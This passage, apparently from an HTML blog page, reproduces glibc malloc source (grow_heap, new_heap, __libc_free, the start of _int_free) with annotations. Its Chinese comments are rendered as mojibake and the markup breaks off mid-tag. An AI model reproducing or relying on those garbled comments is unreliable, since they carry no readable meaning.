class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &gt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb + MINSIZE))<br>    &#123;<br>        remainder_size = size - nb;<br>        remainder = chunk_at_offset (p, nb);<br>        av-&gt;top = remainder;<br>        set_head (p, nb | PREV_INUSE | (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));<br>        set_head (remainder, remainder_size | PREV_INUSE);<br>        check_malloced_chunk (av, p, nb);<br>        <span class="hljs-keyword">return</span> chunk2mem (p);<br>    &#125;<br><br>    <span class="hljs-comment">/* catch all failure paths */</span><br>    __set_errno(ENOMEM);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<h4 id="grow-heap"><a href="#grow-heap" class="headerlink" title="grow_heap"></a>grow_heap</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">grow_heap</span> <span class="hljs-params">(heap_info *h, <span class="hljs-type">long</span> diff)</span><br>&#123;<br>  <span class="hljs-type">size_t</span> pagesize = GLRO (dl_pagesize);<br>  <span class="hljs-type">long</span> new_size;<br><br>  diff = ALIGN_UP (diff, pagesize);<br>  new_size = (<span class="hljs-type">long</span>) h-&gt;size + diff;<br>  <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) new_size &gt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) HEAP_MAX_SIZE)<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br><br>  <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) new_size &gt; h-&gt;mprotect_size)<br>    &#123;<br>      <span class="hljs-keyword">if</span> (__mprotect ((<span class="hljs-type">char</span> *) h + h-&gt;mprotect_size,<br>                      (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) new_size - h-&gt;mprotect_size,<br>                      PROT_READ | PROT_WRITE) != <span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-2</span>;<br><br>      h-&gt;mprotect_size = new_size;<br>    &#125;<br><br>  h-&gt;size = new_size;<br>  LIBC_PROBE (memory_heap_more, <span class="hljs-number">2</span>, h, h-&gt;size);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<h4 id="new-heap"><a href="#new-heap" class="headerlink" title="new_heap"></a>new_heap</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> heap_info *<span class="hljs-title function_">new_heap</span> <span class="hljs-params">(<span class="hljs-type">size_t</span> size, <span class="hljs-type">size_t</span> top_pad)</span><br>&#123;<br>  <span class="hljs-type">size_t</span> pagesize = GLRO (dl_pagesize);<br>  <span class="hljs-type">char</span> *p1, *p2;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> ul;<br>  heap_info *h;<br><br>  <span class="hljs-comment">/* è°ƒæ•´ size çš„å¤§å°ï¼Œsize çš„æœ€å°å€¼ä¸º 32K,æœ€å¤§å€¼ HEAP_MAX_SIZE åœ¨ä¸åŒ */</span><br>  <span class="hljs-comment">/* çš„ç³»ç»Ÿä¸Šä¸åŒï¼Œåœ¨ 32 ä½ç³»ç»Ÿä¸º 1Mï¼Œ64 ä½ç³»ç»Ÿä¸º 64Mï¼Œå°† size çš„å¤§å°è°ƒ */</span><br>  <span class="hljs-comment">/* æ•´åˆ°æœ€å°å€¼ä¸æœ€å¤§å€¼ä¹‹é—´ï¼Œå¹¶ä»¥é¡µå¯¹é½ï¼Œå¦‚æœ size å¤§äºæœ€å¤§å€¼ï¼Œç›´æ¥æŠ¥é”™ */</span><br>  <span class="hljs-keyword">if</span> (size + top_pad &lt; HEAP_MIN_SIZE)<br>    size = HEAP_MIN_SIZE;<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (size + top_pad &lt;= HEAP_MAX_SIZE)<br>    size += top_pad;<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (size &gt; HEAP_MAX_SIZE)<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">else</span><br>    size = HEAP_MAX_SIZE;<br>  size = ALIGN_UP (size, pagesize);<br><br>  <span class="hljs-comment">/* A memory region aligned to a multiple of HEAP_MAX_SIZE is needed.</span><br><span class="hljs-comment">     No swap space needs to be reserved for the following large</span><br><span class="hljs-comment">     mapping (on Linux, this is the case for all non-writable mappings</span><br><span class="hljs-comment">     anyway). */</span><br>  <span class="hljs-comment">/* å…¨å±€å˜é‡ aligned_heap_area æ˜¯ä¸Šä¸€æ¬¡è°ƒç”¨ mmap åˆ†é…å†…å­˜çš„ç»“æŸè™šæ‹Ÿåœ°å€ï¼Œå¹¶å·²ç»æŒ‰ */</span><br>  <span class="hljs-comment">/* ç…§ HEAP_MAX_SIZE å¤§å°å¯¹é½ã€‚å¦‚æœ aligned_heap_area ä¸ä¸ºç©ºï¼Œå°è¯•ä»ä¸Šæ¬¡æ˜ å°„ç»“æŸ */</span><br>  <span class="hljs-comment">/* åœ°å€å¼€å§‹æ˜ å°„å¤§å°ä¸º HEAP_MAX_SIZE çš„å†…å­˜å—ï¼Œç”±äºå…¨å±€å˜é‡ aligned_heap_area æ²¡ */</span><br>  <span class="hljs-comment">/* æœ‰é”ä¿æŠ¤ï¼Œå¯èƒ½å­˜åœ¨å¤šä¸ªçº¿ç¨‹åŒæ—¶ mmap()å‡½æ•°ä» aligned_heap_area å¼€å§‹æ˜ å°„æ–°çš„è™šæ‹Ÿ */</span><br>  <span class="hljs-comment">/* å†…å­˜å—ï¼Œæ“ä½œç³»ç»Ÿä¼šä¿è¯åªä¼šæœ‰ä¸€ä¸ªçº¿ç¨‹ä¼šæˆåŠŸï¼Œå…¶å®ƒåœ¨åŒä¸€åœ°å€æ˜ å°„æ–°è™šæ‹Ÿå†…å­˜å—éƒ½ä¼šå¤±è´¥ã€‚*/</span><br>  <span class="hljs-comment">/* æ— è®ºæ˜ å°„æ˜¯å¦æˆåŠŸï¼Œéƒ½å°†å…¨å±€å˜é‡ aligned_heap_area è®¾ç½®ä¸º NULLã€‚å¦‚æœæ˜ å°„æˆåŠŸï¼Œä½† */</span><br>  <span class="hljs-comment">/* è¿”å›çš„è™šæ‹Ÿåœ°å€ä¸æ˜¯æŒ‰ HEAP_MAX_SIZE å¤§å°å¯¹é½çš„ï¼Œå–æ¶ˆè¯¥åŒºåŸŸçš„æ˜ å°„ï¼Œæ˜ å°„å¤±è´¥ */</span><br>  p2 = MAP_FAILED;<br>  <span class="hljs-keyword">if</span> (aligned_heap_area)<br>    &#123;<br>      p2 = (<span class="hljs-type">char</span> *) MMAP (aligned_heap_area, HEAP_MAX_SIZE, PROT_NONE,<br>                          MAP_NORESERVE);<br>      aligned_heap_area = <span class="hljs-literal">NULL</span>;<br>      <span class="hljs-keyword">if</span> (p2 != MAP_FAILED &amp;&amp; ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) p2 &amp; (HEAP_MAX_SIZE - <span class="hljs-number">1</span>)))<br>        &#123;<br>          __munmap (p2, HEAP_MAX_SIZE);<br>          p2 = MAP_FAILED;<br>        &#125;<br>    &#125;<br><br>  <span class="hljs-comment">/* å…¨å±€å˜é‡ aligned_heap_area æ˜¯ä¸Šä¸€æ¬¡è°ƒç”¨ mmap åˆ†é…å†…å­˜çš„ç»“æŸè™šæ‹Ÿåœ°å€ï¼Œå¹¶å·²ç»æŒ‰ */</span><br>  <span class="hljs-comment">/* ç…§ HEAP_MAX_SIZE å¤§å°å¯¹é½ã€‚å¦‚æœ aligned_heap_area ä¸ä¸ºç©ºï¼Œå°è¯•ä»ä¸Šæ¬¡æ˜ å°„ç»“æŸ */</span>  <br>  <span class="hljs-comment">/* åœ°å€å¼€å§‹æ˜ å°„å¤§å°ä¸º HEAP_MAX_SIZE çš„å†…å­˜å—ï¼Œç”±äºå…¨å±€å˜é‡ aligned_heap_area æ²¡æœ‰é”ä¿æŠ¤ï¼Œå¯</span><br><span class="hljs-comment">èƒ½å­˜åœ¨å¤šä¸ªçº¿ç¨‹åŒæ—¶ mmap()å‡½æ•°ä» aligned_heap_area å¼€å§‹æ˜ å°„æ–°çš„è™šæ‹Ÿå†…å­˜å—ï¼Œæ“ä½œç³»ç»Ÿ</span><br><span class="hljs-comment">ä¼šä¿è¯åªä¼šæœ‰ä¸€ä¸ªçº¿ç¨‹ä¼šæˆåŠŸï¼Œå…¶å®ƒåœ¨åŒä¸€åœ°å€æ˜ å°„æ–°è™šæ‹Ÿå†…å­˜å—éƒ½ä¼šå¤±è´¥ã€‚æ— è®ºæ˜ å°„æ˜¯å¦</span><br><span class="hljs-comment">æˆåŠŸï¼Œéƒ½å°†å…¨å±€å˜é‡ aligned_heap_area è®¾ç½®ä¸º NULLã€‚å¦‚æœæ˜ å°„æˆåŠŸï¼Œä½†è¿”å›çš„è™šæ‹Ÿåœ°å€ä¸</span><br><span class="hljs-comment">æ˜¯æŒ‰ HEAP_MAX_SIZE å¤§å°å¯¹é½çš„ï¼Œå–æ¶ˆè¯¥åŒºåŸŸçš„æ˜ å°„ï¼Œæ˜ å°„å¤±è´¥ã€‚*/</span><br>  <span class="hljs-keyword">if</span> (p2 == MAP_FAILED)<br>    &#123;<br>      p1 = (<span class="hljs-type">char</span> *) MMAP (<span class="hljs-number">0</span>, HEAP_MAX_SIZE &lt;&lt; <span class="hljs-number">1</span>, PROT_NONE, MAP_NORESERVE);<br><br>      <span class="hljs-comment">/* æ˜ å°„ 2 å€ HEAP_MAX_SIZE å¤§å°çš„è™šæ‹Ÿå†…å­˜æˆåŠŸï¼Œå°†å¤§äºç­‰äº p1 å¹¶æŒ‰ HEAP_MAX_SIZE */</span><br>      <span class="hljs-comment">/* å¤§å°å¯¹é½çš„ç¬¬ä¸€ä¸ªè™šæ‹Ÿåœ°å€èµ‹å€¼ç»™ p2ï¼Œp2 ä½œä¸º sub_heap çš„èµ·å§‹è™šæ‹Ÿåœ°å€ï¼Œp2+HEAP_MAX_SIZE */</span><br>      <span class="hljs-comment">/* ä½œä¸º sub_heap çš„ç»“æŸåœ°å€ï¼Œå¹¶å°† sub_heap çš„ç»“æŸåœ°å€èµ‹å€¼ç»™å…¨å±€å˜é‡aligned_heap_areaï¼Œ*/</span><br>      <span class="hljs-comment">/* æœ€åè¿˜éœ€è¦å°†å¤šä½™çš„è™šæ‹Ÿå†…å­˜è¿˜å›ç»™æ“ä½œç³»ç»Ÿ */</span><br>      <span class="hljs-keyword">if</span> (p1 != MAP_FAILED)<br>        &#123;<br>          p2 = (<span class="hljs-type">char</span> *) (((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) p1 + (HEAP_MAX_SIZE - <span class="hljs-number">1</span>))<br>                         &amp; ~(HEAP_MAX_SIZE - <span class="hljs-number">1</span>));<br>          ul = p2 - p1;<br>          <span class="hljs-keyword">if</span> (ul)<br>            __munmap (p1, ul);<br>          <span class="hljs-keyword">else</span><br>            aligned_heap_area = p2 + HEAP_MAX_SIZE;<br>          __munmap (p2 + HEAP_MAX_SIZE, HEAP_MAX_SIZE - ul);<br>        &#125;<br>      <span class="hljs-keyword">else</span><br>        &#123;<br>          <span class="hljs-comment">/* Try to take the chance that an allocation of only HEAP_MAX_SIZE</span><br><span class="hljs-comment">             is already aligned. */</span><br>          <span class="hljs-comment">/* æ˜ å°„ 2 å€ HEAP_MAX_SIZE å¤§å°çš„è™šæ‹Ÿå†…å­˜å¤±è´¥äº†ï¼Œå†å°è¯•æ˜ å°„ HEAP_MAX_SIZE */</span><br>          <span class="hljs-comment">/* å¤§å°çš„è™šæ‹Ÿå†…å­˜ï¼Œå¦‚æœå¤±è´¥ï¼Œè¿”å›ï¼›å¦‚æœæˆåŠŸï¼Œä½†è¯¥è™šæ‹Ÿåœ°å€ä¸æ˜¯æŒ‰ç…§ HEAP_MAX_SIZE */</span><br>          <span class="hljs-comment">/* å¤§å°å¯¹é½çš„ï¼Œè¿”å› */</span><br>          p2 = (<span class="hljs-type">char</span> *) MMAP (<span class="hljs-number">0</span>, HEAP_MAX_SIZE, PROT_NONE, MAP_NORESERVE);<br>          <span class="hljs-keyword">if</span> (p2 == MAP_FAILED)<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>          <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) p2 &amp; (HEAP_MAX_SIZE - <span class="hljs-number">1</span>))<br>            &#123;<br>              __munmap (p2, HEAP_MAX_SIZE);<br>              <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>  <span class="hljs-comment">/* è°ƒç”¨ mprotect()å‡½æ•°å°† size å¤§å°çš„å†…å­˜è®¾ç½®ä¸ºå¯è¯»å¯å†™ï¼Œå¦‚æœå¤±è´¥ï¼Œ*/</span><br>  <span class="hljs-comment">/* è§£é™¤æ•´ä¸ª sub_heap çš„æ˜ å°„ã€‚ç„¶åæ›´æ–° heap_info å®ä¾‹ä¸­çš„ç›¸å…³å­—æ®µ */</span><br>  <span class="hljs-keyword">if</span> (__mprotect (p2, size, PROT_READ | PROT_WRITE) != <span class="hljs-number">0</span>)<br>    &#123;<br>      __munmap (p2, HEAP_MAX_SIZE);<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>  h = (heap_info *) p2;<br>  h-&gt;size = size;<br>  h-&gt;mprotect_size = size;<br>  LIBC_PROBE (memory_heap_new, <span class="hljs-number">2</span>, h, h-&gt;size);<br>  <span class="hljs-keyword">return</span> h;<br>&#125;<br><br></code></pre></td></tr></table></figure>

<h3 id="libc-free"><a href="#libc-free" class="headerlink" title="__libc_free"></a>__libc_free</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">  free(void* p)</span><br><span class="hljs-comment">  Releases the chunk of memory pointed to by p, that had been previously</span><br><span class="hljs-comment">  allocated using malloc or a related routine such as realloc.</span><br><span class="hljs-comment">  It has no effect if p is null. It can have arbitrary (i.e., bad!)</span><br><span class="hljs-comment">  effects if p has already been freed.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">  Unless disabled (using mallopt), freeing very large spaces will</span><br><span class="hljs-comment">  when possible, automatically trigger operations that give</span><br><span class="hljs-comment">  back unused memory to the system, thus reducing program footprint.</span><br><span class="hljs-comment">*/</span><br><span class="hljs-type">void</span> __libc_free(<span class="hljs-type">void</span> *mem) &#123;<br>    mstate ar_ptr;<br>    mchunkptr p;                          <span class="hljs-comment">/* chunk corresponding to mem */</span><br><br>    <span class="hljs-comment">// å¦‚æœå­˜åœ¨ __free_hook åˆ™æ‰§è¡Œå…¶å†…å®¹</span><br>    <span class="hljs-type">void</span> (*hook)(<span class="hljs-type">void</span> *, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *)<br>    = atomic_forced_read(__free_hook);<br>    <span class="hljs-keyword">if</span> (__builtin_expect(hook != <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>)) &#123;<br>        (*hook)(mem, RETURN_ADDRESS (<span class="hljs-number">0</span>));<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-comment">// free NULL</span><br>    <span class="hljs-keyword">if</span> (mem == <span class="hljs-number">0</span>)                              <span class="hljs-comment">/* free(0) has no effect */</span><br>        <span class="hljs-keyword">return</span>;<br><br>    <span class="hljs-comment">// æ‹¿åˆ°ç¨‹åºæŒ‡é’ˆ</span><br>    p = mem2chunk (mem);<br><br>    <span class="hljs-comment">// å¦‚æœ chunk æ˜¯ mmap å‡½æ•°è¿”å›çš„ï¼Œåˆ™ä½¿ç”¨ munmap_chunk å‡½æ•°é‡Šæ”¾</span><br>    <span class="hljs-keyword">if</span> (chunk_is_mmapped (p))                       <span class="hljs-comment">/* release mmapped memory. */</span><br>    &#123;<br>        <span class="hljs-comment">/* See if the dynamic brk/mmap threshold needs adjusting.</span><br><span class="hljs-comment">       Dumped fake mmapped chunks do not affect the threshold.  */</span><br>        <span class="hljs-comment">// å¦‚æœå¼€å¯äº†mmapåˆ†é…é˜ˆå€¼åŠ¨æ€è°ƒæ•´æœºåˆ¶</span><br>        <span class="hljs-comment">// å¦‚æœå½“å‰ free çš„ chunk çš„å¤§å°å¤§äºè®¾ç½®çš„ mmap åˆ†é…é˜ˆå€¼</span><br>        <span class="hljs-comment">// ä¸”å°äº mmap åˆ†é…é˜ˆå€¼çš„æœ€å¤§å€¼</span><br>        <span class="hljs-keyword">if</span> (!mp_.no_dyn_threshold<br>            &amp;&amp; chunksize_nomask (p) &gt; mp_.mmap_threshold<br>            &amp;&amp; chunksize_nomask (p) &lt;= DEFAULT_MMAP_THRESHOLD_MAX<br>            &amp;&amp; !DUMPED_MAIN_ARENA_CHUNK (p)) &#123;<br>            <span class="hljs-comment">// å°†å½“å‰ chunk çš„å¤§å°èµ‹å€¼ç»™ mmap åˆ†é…é˜ˆå€¼</span><br>            mp_.mmap_threshold = chunksize (p);<br>            <span class="hljs-comment">// mmap æ”¶ç¼©é˜ˆå€¼ä¸º mmapåˆ†é…é˜ˆå€¼çš„ 2 å€</span><br>            mp_.trim_threshold = <span class="hljs-number">2</span> * mp_.mmap_threshold;<br>            LIBC_PROBE(memory_mallopt_free_dyn_thresholds, <span class="hljs-number">2</span>,<br>                       mp_.mmap_threshold, mp_.trim_threshold);<br>        &#125;<br>        <span class="hljs-comment">//ç„¶åè°ƒç”¨ munmap_chunké‡Šæ”¾å‡½æ•°</span><br>        munmap_chunk(p);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    MAYBE_INIT_TCACHE ();<br>    <span class="hljs-comment">// è·å¾—æŒ‡å‘ arena çš„æŒ‡é’ˆ</span><br>    ar_ptr = arena_for_chunk (p);<br>    <span class="hljs-comment">// ä½¿ç”¨ _int_free é‡Šæ”¾ chunk</span><br>    _int_free(ar_ptr, p, <span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure>



<h3 id="int-free"><a href="#int-free" class="headerlink" title="_int_free"></a>_int_free</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span><br>_int_free(mstate av, mchunkptr p, <span class="hljs-type">int</span> have_lock) &#123;<br>    INTERNAL_SIZE_T size;        <span class="hljs-comment">/* its size */</span><br>    mfastbinptr *fb;             <span class="hljs-comment">/* associated fastbin */</span><br>    mchunkptr nextchunk;         <span class="hljs-comment">/* next contiguous chunk */</span><br>    INTERNAL_SIZE_T nextsize;    <span class="hljs-comment">/* its size */</span><br>    <span class="hljs-type">int</span> nextinuse;               <span class="hljs-comment">/* true if nextchunk is used */</span><br>    INTERNAL_SIZE_T prevsize;    <span 